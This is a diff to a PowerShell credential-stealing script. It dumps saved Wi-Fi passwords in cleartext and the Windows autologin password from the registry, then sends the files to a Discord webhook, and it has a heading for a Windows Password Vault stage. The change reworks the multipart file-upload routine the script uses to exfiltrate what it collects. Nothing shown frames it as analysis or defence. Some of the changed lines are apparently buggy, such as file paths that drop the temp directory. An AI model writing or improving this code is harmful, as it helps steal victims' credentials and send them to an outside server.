@@ -30,30 +30,22 @@ function Send-DiscordWebhook {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -Headers $headers
     }
     if(-not ([string]::IsNullOrEmpty($File))) {
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        $fileName = [System.IO.Path]::GetFileName($File)
-        $fileContent = [System.IO.File]::ReadAllBytes($File)
+        $FilePath = $File
+        $FieldName = 'document'
+        $ContentType = 'text/plain'
 
-        $bodyLines = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file0`"; filename=`"$fileName`"",
-            "Content-Type: application/octet-stream$LF",
-            $fileContent,
-            "--$boundary--"
-        )
+        $FileStream = [System.IO.FileStream]::new($filePath, [System.IO.FileMode]::Open)
+        $FileHeader = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new('form-data')
+        $FileHeader.Name = $FieldName
+        $FileHeader.FileName = Split-Path -leaf $FilePath
+        $FileContent = [System.Net.Http.StreamContent]::new($FileStream)
+        $FileContent.Headers.ContentDisposition = $FileHeader
+        $FileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse($ContentType)
 
-        $body = $bodyLines -join $LF
-        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
-        # Manually insert the file content in the correct position (after headers, before the final boundary)
-        $fileContentStart = $body.IndexOf($fileContent)
-        $bodyBytes[$fileContentStart..($fileContentStart+$fileContent.Length-1)] = $fileContent
+        $MultipartContent = [System.Net.Http.MultipartFormDataContent]::new()
+        $MultipartContent.Add($FileContent)
 
-        $headers = @{
-            "Content-Type" = "multipart/form-data; boundary=$boundary"
-        }
-
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Headers $headers -Body $bodyBytes
+        Invoke-WebRequest -Body $MultipartContent -Method 'POST' -Uri $WebhookUrl
     }
 }
 
@@ -61,13 +53,13 @@ function Send-DiscordWebhook {
 $FileNameWifi = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFiPasswords.txt"
 $wifiprofiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
 $wifiprofiles > $env:TMP\$FileNameWifi 
-Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Wifi" -File $env:TMP\$FileNameWifi
+Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Wifi" -File $FileNameWifi
 
 # Autologin password
 $FileNameAutoLogin = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_AutoLogin.txt"
 echo Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword" > $env:TMP\$FileNameAutoLogin
 If (($AutoLoginPassword).DefaultPassword) {
-    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "AutoLogin" -File $env:TMP\$FileNameAutoLogin
+    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "AutoLogin" -File $FileNameAutoLogin
 } 
 
 # Windows Password Vault
